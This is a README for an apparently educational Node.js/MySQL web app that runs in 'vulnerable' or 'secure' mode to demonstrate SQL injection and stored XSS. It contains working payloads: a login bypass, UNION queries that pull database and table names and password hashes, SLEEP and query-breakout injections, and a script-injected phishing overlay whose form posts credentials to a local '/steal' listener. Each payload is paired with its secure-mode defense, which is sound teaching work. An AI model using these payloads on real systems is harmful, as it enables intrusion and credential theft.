# Comunication_LTD Secure Web System

Web-based information system for Comunication_LTD with two operation modes:

- `vulnerable`: intentionally demonstrates SQL Injection and Stored XSS.
- `secure`: applies prepared statements and output encoding defenses.

Important: the vulnerable mode and runtime mode switch exist only for learning purposes and project presentation simplicity.

## Features

- Registration with password policy validation from `config.json`
- HMAC-SHA256 password storage with per-user unique salt
- Login lockout: 3 failed attempts -> 30-minute lock
- Session-based authentication using `express-session`
- Password change with last-3 password reuse prevention
- Password recovery with SHA-1 token hash and SMTP email delivery
- Customer management page for SQLi/XSS testing in both modes

## Installation Guide

### 1. Prerequisites

- Node.js 18+
- MySQL 8+

### 2. Install dependencies

```bash
npm install
```

### 3. Configure environment

Create `.env` based on `.env.example`.

Required values:

- `APP_MODE=secure` or `APP_MODE=vulnerable`
- `SESSION_SECRET`
- `DB_HOST`, `DB_PORT`, `DB_USER`, `DB_PASSWORD`, `DB_NAME`
- `HMAC_SECRET`
- `SMTP_HOST`, `SMTP_PORT`, `SMTP_SECURE`, `SMTP_USER`, `SMTP_PASS`, `SMTP_FROM`

Recommended database name: `communication_ltd`

### 4. Database setup (MySQL)

Run the schema file:

```bash
mysql -u root -p < db/schema.sql
```

### 5. Security policy setup

Adjust password and lockout policies in `config.json`.

## Usage Instructions

### Start application

Development mode:

```bash
npm run dev
```

Production-like run:

```bash
npm start
```

### Toggle Vulnerable vs Secure

Initial mode is set in `.env`:

- `APP_MODE=vulnerable` for demonstration mode
- `APP_MODE=secure` for protected mode

If `APP_MODE` is missing or invalid, the app intentionally fails startup.

Mode cannot be changed web UI, you need to change it in `.env` and restart the app.

### Web UI

Default URL: `http://localhost:3000`

Screens:

- `/login`
- `/register`
- `/forgot-password`
- `/verify-token`
- `/reset-password`
- `/change-password`
- `/dashboard`

## SMTP Configuration Guide

- Use a valid SMTP provider and credentials.
- For providers requiring app passwords (e.g. Gmail), generate an app password and place it in `SMTP_PASS`.
- Ensure firewall/network allows outbound SMTP traffic.

Recovery flow behavior:

- A reset token is generated in plaintext.
- Only SHA-1 hash of that token is stored in DB.
- Plain token is sent to user email via SMTP.


## SQL Injection (SQLi) - Security Testing & Exploitation Playbook - 

Use only in local/test environments.

### 1. Authentication Bypass on Login Page (`/login`)
* **Target Environment:** `vulnerable` mode.
* **Payload (Username Field):** `' OR '1'='1' --` (Any arbitrary value for password).
* **How it works:** The raw string is treated as executable code by the database engine. Since `'1'='1'` evaluates unconditionally to `true`, the query structural short-circuits, completely bypassing the password checking logic.
* **Secure Mode Behavior:** The input payload is cast securely as a literal string parameter, causing the query to search for that precise text name and safely failing authentication.

### 2. Data Exfiltration via Registration (`/register`)
By abusing descriptive validation messages meant to flag taken usernames, an attacker can append a `UNION` clause to siphon contents from other database relations. Because the internal system lookup query targets a single column (`SELECT username`), the payload must match the target matrix with exactly one column.

* **Siphoning Active Database Name:**
  * **Input Username:** `' UNION SELECT DATABASE() -- `
  * **Response Result:** `Registration failed. 'communication_ltd' is already in use.`
* **Siphoning Structure Schema (Table Discovery):**
  * **Input Username:** `' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 0,1 -- `
  * **Response Result:** `Registration failed. 'users' is already in use.` *(Iterate the `LIMIT` constraint to scan further tables).*
* **Siphoning Credential Hashes:**
  * **Input Username:** `' UNION SELECT password_hash FROM users WHERE username = 'com_ltd' -- `
  * **Response Result:** `Registration failed. 'b4e90eccb9b5fd35507178c20348770b256276f7bf39a086d0665e9b21652683' is already in use.`

* **Why it works:** The first part of the lookup query returns 0 rows (since no user with an empty username exists), so the first row returned in the results array (`existingRows[0]`) is the output of our injected `UNION` statement, which is then reflected directly inside the user-facing error message.

### 3. System Disruptions & Forgery via Dashboard (`/dashboard`)
* **Time-Based Inference / Sleep Exploit:**
  * **Input Customer Name:** `' + SLEEP(10) + '`
  * **Result:** If the backend freezes processing for exactly 10 seconds, it explicitly confirms raw expression injection vectors.
* **Query Breakout & Data Forgery:**
  * **Input Sector Field:** `Legal', '2025-01-01') #`
  * **Result:** The trailing comment symbol (`#`) forcefully drops the remainder of the concatenated runtime string (`NOW()`), executing the statement with a manipulated creation date instead.


### Stored Cross-Site Scripting (Stored XSS) -

#### Dashboard Customer Management Flow
In vulnerable compilation cycles, input submitted via the client forms is preserved raw into the database layer and subsequently displayed using unchecked HTML evaluation mechanics (`<%- %>`).

* **Basic Pop-up PoC Exploit:**
  * **Input Customer Name:** `<script>alert("XSS Attack: Session Exploited!");</script>`
  * **Expected Result (Vulnerable):** The script successfully saves to the database. Every time an administrator loads the dashboard view, the browser executes the stored payload, firing a modal alert notification box dynamically.
  * **Expected Result (Secure):** The payload is safely contextually encoded using secure EJS display tags (`<%= %>`), rendering as harmless plain text.

* **Advanced Social Engineering/Phishing Overlay Exploit (Box Modal):**
  * **Input Customer Name:**
    ```html
    <script>document.body.innerHTML = `<div style="display: flex; justify-content: center; align-items: center; height: 100vh; background-color: rgba(0,0,0,0.5); position: fixed; top: 0; left: 0; width: 100%; z-index: 9999;"><form action="http://localhost:4000/steal" method="POST" style="background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); text-align: center; width: 350px; font-family: sans-serif;"><h2 style="margin-bottom: 25px; color: #333;">Session Expired</h2><p style="color: #666; margin-bottom: 30px;">Please re-authenticate to continue.</p><input type="text" name="username" placeholder="Username" required style="width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box;"><input type="password" name="password" placeholder="Password" required style="width: 100%; padding: 12px; margin-bottom: 25px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box;"><input type="submit" value="Login" style="width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold;"></form></div>`;</script>
    ```
  * **Expected Result (Vulnerable):** The malicious script completely intercepts the administrator interface viewport, substituting a pixel-perfect credential harvesting layout. When credentials are typed, they are posted straight to the attacker's listener backend.
  * **Important Database Requirement:** For this advanced payload to execute successfully without triggering an `ER_DATA_TOO_LONG` error, the database column size must be expanded. It is required to modify the `customer_name` column to support larger data formats (e.g., `TEXT` which supports up to 65,000 characters) using the following command before execution:
    ```sql
    ALTER TABLE customers MODIFY COLUMN customer_name TEXT;
    ```
  * **Expected Result (Secure):** The entire string is treated as data rather than code, breaking no application layout and preventing any unauthorized script runtime execution.

#### Why it works in Vulnerable Mode vs. Why it fails in Secure Mode:
* **Why it works (`vulnerable`):** The application utilizes the raw HTML evaluation tag `<%- customers[i].customer_name %>` inside the EJS view template. This explicitly instructs the rendering engine to inject the database content directly into the DOM as active executable code. Since the input validation is missing on the controller level, the browser interprets the `<script>` tags, rendering the styles and capturing administration input without restriction.
* **Why it fails (`secure`):** The code is hardened by swapping the unsafe injection tag with the standard EJS escape sequence: `<%= customers[i].customer_name %>`. This automatically applies HTML entity encoding, safely converting dangerous characters like `<` and `>` into their harmless literal counterparts (`&lt;` and `&gt;`). As a result, the browser treats the injection strictly as passive text data rather than executable JavaScript instructions.



## Project Structure

```text
.
├── db/
│   └── schema.sql
├── public/
│   └── css/
├── src/
│   ├── controllers/
│   ├── middleware/
│   ├── models/
│   ├── routes/
│   └── utils/
├── views/
├── config.json
├── server.js
└── README.md
```

## Changelog

### 2026-04-27

- Initial project scaffold created
- Implemented authentication, session, password change, and reset flows
- Implemented mode toggle (`vulnerable` / `secure`) for SQLi and XSS demonstrations
- Added MySQL schema and full EJS UI screens
- Added runtime web UI mode switcher on Dashboard for demo/learning simplicity

### 2026-05-20

- Added a protected reflected search endpoint: `/customers/search` (GET).
- Added a Search form on the Dashboard that submits to the new route.
- Implemented `searchCustomers` in `src/controllers/customerController.js` to perform a database-backed search and pass `q` and matched `customers` to the view.
- Search is restricted to `customer_name` only. In `secure` mode the query uses a parameterized `execute` call; in `vulnerable` mode it uses a string-built SQL query (for demonstration).
- Added `views/search-results.ejs` to display the query and matching customers. Rendering of the user-supplied `q` follows `appMode`: raw EJS output (`<%- q %>`) in `vulnerable` mode to demonstrate Reflected XSS, and escaped EJS output (`<%= q %>`) in `secure` mode to mitigate it.
- Updated the Security Testing section with a Reflected XSS payload example and expected behavior in both modes.
